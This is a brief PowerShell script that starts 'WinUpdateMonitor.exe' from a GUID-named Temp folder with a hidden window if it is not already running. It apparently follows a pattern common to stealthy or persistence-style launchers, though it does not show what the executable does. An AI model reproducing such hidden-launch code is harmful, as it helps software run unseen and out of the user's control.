$exePath = "$env:Temp\258A2F13-D6F4-4CC9-A250-BD4CF37E9166\WinUpdateMonitor.exe"

# Check if the process is already running
if (-not (Get-Process WinUpdateMonitor -ErrorAction SilentlyContinue)) {
    Start-Process -FilePath $exePath -WindowStyle Hidden
}
